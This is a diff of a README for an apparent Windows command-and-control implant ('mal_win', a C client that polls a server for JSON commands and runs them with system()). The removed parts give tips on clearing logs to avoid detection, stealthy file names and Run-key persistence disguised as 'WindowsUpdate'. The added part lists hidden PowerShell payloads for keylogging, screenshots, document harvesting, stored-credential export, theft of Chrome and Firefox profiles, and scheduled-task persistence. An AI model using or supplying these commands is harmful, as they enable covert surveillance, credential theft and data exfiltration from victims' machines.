-sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "type %USERPROFILE%\\debug.log"
-
-# Retrieve binary debug log
-sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:debug.log ./binary_debug.log
-```
-
-### Monitoring Best Practices
-
-1. **Rotate Logs**: Clear old logs periodically to avoid detection
-   ```json
-   {
-     "command": "cmd /c del C:\\temp\\*.txt C:\\temp\\*.log && echo Logs cleared",
-     "next": "YOUR_SERVER_IP",
-     "sleep": 60
-   }
-   ```
-
-2. **Compress Logs**: Compress logs before retrieval
-   ```bash
-   sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "powershell Compress-Archive -Path C:\\temp\\*.log -DestinationPath C:\\temp\\logs.zip"
-   sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/logs.zip ./
-   ```
-
-3. **Scheduled Collection**: Use cron for automated log collection
-   ```bash
-   # Add to crontab
-   */30 * * * * /path/to/collect_logs.sh >> /var/log/collection.log 2>&1
-   ```
-
-4. **Stealth**: Use inconspicuous log file names
-   ```json
-   {
-     "command": "cmd /c systeminfo > C:\\temp\\update.tmp && type C:\\temp\\update.tmp",
-     "next": "YOUR_SERVER_IP",
-     "sleep": 60
-   }
-   ```
 
 ## Troubleshooting
 
-### Binary Not Connecting
+### Connection Issues
 
-```bash
-# Test network connectivity
-curl http://SERVER_IP:8080/
+- **"Connection failed"**: Server may be down or firewall blocking
+- **"Connection timeout"**: Network issues or server not responding (30-second timeout)
+- **"Failed to receive HTTP response"**: Connection interrupted during data transfer
 
-# Check Windows firewall
-netsh advfirewall show allprofiles
+### JSON Parsing Issues
 
-# Verify DNS resolution
-nslookup SERVER_IP
+- **"JSON missing 'command' key"**: Server returned JSON without the required "command" field
+- **"Invalid JSON syntax"**: Server returned malformed JSON
+- **"Empty command value"**: JSON contains "command" key but value is empty
+
+### Command Execution Issues
+
+- **"Command execution failed"**: The command returned a non-zero exit status
+- **"Empty command"**: No command was provided to execute
+
+## Implementation Details
+
+- Uses only C standard library and Windows API (no external dependencies)
+- Manual HTTP implementation via Windows Sockets (Winsock2)
+- Manual JSON parsing for simple key-value structure
+- Command execution via `system()` function
+- Error logging to file using standard file I/O
+- 30-second network timeout for all socket operations
+- Comprehensive error handling with appropriate exit codes
+
+## Testing
+
+Test the program with various scenarios:
+
+1. **Successful execution**: Run against a working server
+2. **Network failure**: Disconnect network or block server access
+3. **HTTP errors**: Test with server returning non-200 status codes
+4. **Invalid JSON**: Test with server returning malformed JSON
+5. **Missing command key**: Test with JSON without "command" field
+
+## Useful Commands for Remote Execution
+
+The following commands can be sent via the JSON `command` key for various purposes:
+
+### Keylogger Operations
+
+```json
+{"command": "powershell -WindowStyle Hidden -Command \"$keylog = ''; while($true) { $key = $null; $key = [System.Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}'); Start-Sleep -Milliseconds 100; }\"", "sleep": 5, "next": "192.168.1.100"}
 ```
 
-### Persistence Not Working
-
-```bash
-# Verify registry entry exists
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate
-
-# Check registry value points to correct path
-# Should show full path to remote_cmd.exe with arguments
-
-# Manually update if needed
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\path\to\remote_cmd.exe SERVER_IP PORT --debug" /f
-```
-
-### Server Not Responding
-
-```bash
-# Check if server is running
-ps aux | grep server_new.py
-
-# Verify port is listening
-ss -tuln | grep 8080
-
-# Check server logs
-tail -f /tmp/server_cnc.log
-```
-
-## Unit Testing
-
-### Overview
-
-The project includes comprehensive unit tests using Google Test (gtest) framework. Tests cover all utility functions and core parsing logic.
-
-### Test Coverage
-
-**Utils Class** (24 tests):
-- `strlen` - String length calculation
-- `strcmp` - String comparison
-- `strcpy` - String copy
-- `strcat` - String concatenation
-- `strstr` - Substring search
-- `strchr` - Character search
-- `atoi` - String to integer conversion
-
-**JsonParser Class** (8 tests):
-- Valid JSON parsing
-- JSON with whitespace
-- Missing fields handling
-- Complex command parsing
-- Edge cases (empty JSON, zero values)
-
-### Running Tests
-
-#### Prerequisites
-```bash
-# Install Google Test (macOS)
-brew install googletest
-
-# Or use Makefile helper
-make -f Makefile.test install-gtest
-```
-
-#### Build and Run
-```bash
-# Build tests
-make -f Makefile.test
-
-# Run all tests
-make -f Makefile.test test
-
-# Run with verbose output
-make -f Makefile.test test-verbose
-
-# Run specific test suite
-make -f Makefile.test test-filter FILTER='UtilsTest.*'
-
-# Run specific test
-make -f Makefile.test test-filter FILTER='UtilsTest.StrlenBasic'
-```
-
-#### Clean
-```bash
-make -f Makefile.test clean
-```
-
-### Test Results
-
-All 32 tests passing:
-```
-[==========] Running 32 tests from 2 test suites.
-[----------] 24 tests from UtilsTest
-[  PASSED  ] 24 tests.
-[----------] 8 tests from JsonParserTest
-[  PASSED  ] 8 tests.
-[==========] 32 tests from 2 test suites ran.
-[  PASSED  ] 32 tests.
-```
-
-### Test File Structure
-
-```
-test_remote_executor.cpp    # Main test file
-Makefile.test               # Test build configuration
-```
-
-### Adding New Tests
-
-To add new tests, follow the Google Test pattern:
-
-```cpp
-TEST_F(UtilsTest, YourTestName) {
-    // Arrange
-    const char* input = "test";
-    
-    // Act
-    size_t result = Utils::strlen(input);
-    
-    // Assert
-    EXPECT_EQ(result, 4);
+**Prettified Command:**
+```powershell
+$keylog = ''
+while($true) {
+    $key = $null
+    $key = [System.Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}')
+    Start-Sleep -Milliseconds 100
 }
 ```
 
-## Development
-
-### Building from Source
-
-```bash
-# Clone repository
-git clone git@github.com:iklobato/mal_win.git
-cd mal_win
-
-# Build
-make -f Makefile.win.cpp
-
-# Clean build artifacts
-make -f Makefile.win.cpp clean
+```json
+{"command": "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1", "sleep": 10, "next": "192.168.1.100"}
 ```
 
-### Testing Locally
+**Prettified Command:**
+```powershell
+# Execute external keylogger script
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1
+```
 
-```bash
-# Start local server
-python3 server_new.py
+### Screenshot Operations
 
-# Test with curl
-curl http://localhost:8080/
-# Expected: {"command": "...", "next": "...", "sleep": ...}
+```json
+{"command": "powershell -WindowStyle Hidden -Command \"Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save('screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $bmp.Dispose()\"", "sleep": 5, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```powershell
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+
+# Get primary screen bounds
+$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+
+# Create bitmap and graphics objects
+$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+$graphics = [System.Drawing.Graphics]::FromImage($bmp)
+
+# Capture screen
+$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+
+# Save screenshot
+$bmp.Save('screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png)
+
+# Cleanup
+$graphics.Dispose()
+$bmp.Dispose()
+```
+
+```json
+{"command": "nircmd.exe savescreenshot screenshot.png", "sleep": 3, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+nircmd.exe savescreenshot screenshot.png
+```
+
+### File Operations
+
+```json
+{"command": "powershell -WindowStyle Hidden -Command \"Compress-Archive -Path C:\\Users\\*\\Documents\\* -DestinationPath docs.zip -Force\"", "sleep": 2, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```powershell
+# Compress all documents from user directories
+Compress-Archive -Path C:\Users\*\Documents\* -DestinationPath docs.zip -Force
+```
+
+```json
+{"command": "certutil -encode file.txt encoded.txt && type encoded.txt", "sleep": 1, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+certutil -encode file.txt encoded.txt
+type encoded.txt
+```
+
+```json
+{"command": "powershell -WindowStyle Hidden -Command \"Get-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.pdf,*.doc,*.docx -ErrorAction SilentlyContinue | Select-Object FullName | Out-File files.txt\"", "sleep": 5, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```powershell
+# Find and list all documents
+Get-ChildItem -Path C:\Users -Recurse `
+    -Include *.txt,*.pdf,*.doc,*.docx `
+    -ErrorAction SilentlyContinue | 
+    Select-Object FullName | 
+    Out-File files.txt
+```
+
+### Network Operations
+
+```json
+{"command": "ipconfig /all > network_info.txt", "sleep": 2, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+ipconfig /all > network_info.txt
+```
+
+```json
+{"command": "netstat -ano > connections.txt", "sleep": 2, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+netstat -ano > connections.txt
+```
+
+```json
+{"command": "arp -a > arp_table.txt", "sleep": 1, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+arp -a > arp_table.txt
+```
+
+### System Information
+
+```json
+{"command": "systeminfo > system_info.txt", "sleep": 3, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+systeminfo > system_info.txt
+```
+
+```json
+{"command": "wmic process list full > processes.txt", "sleep": 2, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+wmic process list full > processes.txt
+```
+
+```json
+{"command": "wmic service list brief > services.txt", "sleep": 2, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+wmic service list brief > services.txt
+```
+
+### Data Exfiltration
+
+```json
+{"command": "powershell -WindowStyle Hidden -Command \"$files = Get-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.pdf -ErrorAction SilentlyContinue | Select-Object -First 10 FullName; $files | ForEach-Object { Copy-Item $_.FullName -Destination C:\\temp\\ }\"", "sleep": 10, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```powershell
+# Find and copy first 10 documents
+$files = Get-ChildItem -Path C:\Users -Recurse `
+    -Include *.txt,*.pdf `
+    -ErrorAction SilentlyContinue | 
+    Select-Object -First 10 FullName
+
+# Copy files to temp directory
+$files | ForEach-Object {
+    Copy-Item $_.FullName -Destination C:\temp\
+}
+```
+
+```json
+{"command": "powershell -WindowStyle Hidden -Command \"$cred = Get-StoredCredential -Target *; $cred | Export-Clixml creds.xml\"", "sleep": 3, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```powershell
+# Extract stored credentials
+$cred = Get-StoredCredential -Target *
+$cred | Export-Clixml creds.xml
+```
+
+### Registry Operations
+
+```json
+{"command": "reg export HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run startup.reg", "sleep": 2, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+reg export HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run startup.reg
+```
+
+```json
+{"command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s > installed_software.txt", "sleep": 5, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s > installed_software.txt
+```
+
+### Process Management
+
+```json
+{"command": "tasklist /svc > running_processes.txt", "sleep": 2, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+tasklist /svc > running_processes.txt
+```
+
+```json
+{"command": "wmic startup get caption,command > startup_programs.txt", "sleep": 2, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+wmic startup get caption,command > startup_programs.txt
+```
+
+### Browser Data
+
+```json
+{"command": "powershell -WindowStyle Hidden -Command \"Copy-Item -Path \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\*\" -Destination C:\\temp\\chrome_data\\ -Recurse -ErrorAction SilentlyContinue\"", "sleep": 10, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```powershell
+# Copy Chrome user data
+Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\*" `
+    -Destination C:\temp\chrome_data\ `
+    -Recurse `
+    -ErrorAction SilentlyContinue
+```
+
+```json
+{"command": "powershell -WindowStyle Hidden -Command \"Copy-Item -Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\" -Destination C:\\temp\\firefox_data\\ -Recurse -ErrorAction SilentlyContinue\"", "sleep": 10, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```powershell
+# Copy Firefox profiles
+Copy-Item -Path "$env:APPDATA\Mozilla\Firefox\Profiles\*" `
+    -Destination C:\temp\firefox_data\ `
+    -Recurse `
+    -ErrorAction SilentlyContinue
+```
+
+### Stealth Operations
+
+```json
+{"command": "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"Start-Process cmd.exe -WindowStyle Hidden -ArgumentList '/c command_here'\"", "sleep": 2, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```powershell
+# Execute command in hidden window
+Start-Process cmd.exe `
+    -WindowStyle Hidden `
+    -ArgumentList '/c command_here'
+```
+
+```json
+{"command": "schtasks /create /tn \"UpdateTask\" /tr \"command_here\" /sc onlogon /f", "sleep": 1, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```cmd
+schtasks /create /tn "UpdateTask" /tr "command_here" /sc onlogon /f
+```
+
+### Combined Operations
+
+```json
+{"command": "powershell -WindowStyle Hidden -Command \"$screenshot = 'screenshot.png'; Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save($screenshot, [System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $bmp.Dispose(); systeminfo > sysinfo.txt; ipconfig /all > netinfo.txt\"", "sleep": 5, "next": "192.168.1.100"}
+```
+
+**Prettified Command:**
+```powershell
+# Take screenshot
+$screenshot = 'screenshot.png'
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+
+$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+$graphics = [System.Drawing.Graphics]::FromImage($bmp)
+$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+$bmp.Save($screenshot, [System.Drawing.Imaging.ImageFormat]::Png)
+$graphics.Dispose()
+$bmp.Dispose()
+
+# Collect system and network info
+systeminfo > sysinfo.txt
+ipconfig /all > netinfo.txt
 ```
 
 ## License
 
-This project is for educational and authorized testing purposes only. Unauthorized use is prohibited.
-
-## Disclaimer
-
-⚠️ **WARNING**: This tool is designed for legitimate system administration and authorized security testing only. Unauthorized access to computer systems is illegal. The authors are not responsible for misuse of this software.
-
-## Credits
-
-Developed for remote system administration and security research purposes.
+[Add license information as needed]
